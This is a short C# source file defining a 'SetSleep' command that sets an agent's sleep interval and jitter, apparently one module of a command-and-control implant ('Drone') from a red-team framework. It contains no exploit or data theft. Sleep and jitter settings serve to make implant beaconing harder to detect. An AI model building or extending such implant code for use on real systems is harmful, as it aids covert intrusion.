using System.Threading;

using Drone.Interfaces;

namespace Drone.Commands;

public class SetSleep : DroneCommand
{
    public override byte Command => 0x01;
    public override bool Threaded => false;
    
    public override void Execute(DroneTask task, CancellationToken cancellationToken)
    {
        if (task.Arguments.Length > 0)
            Drone.Config.Set(Setting.SLEEP_INTERVAL, int.Parse(task.Arguments[0]));
        
        if (task.Arguments.Length > 1)
            Drone.Config.Set(Setting.SLEEP_JITTER, int.Parse(task.Arguments[1]));

        Drone.SendTaskComplete(task.Id);
    }
}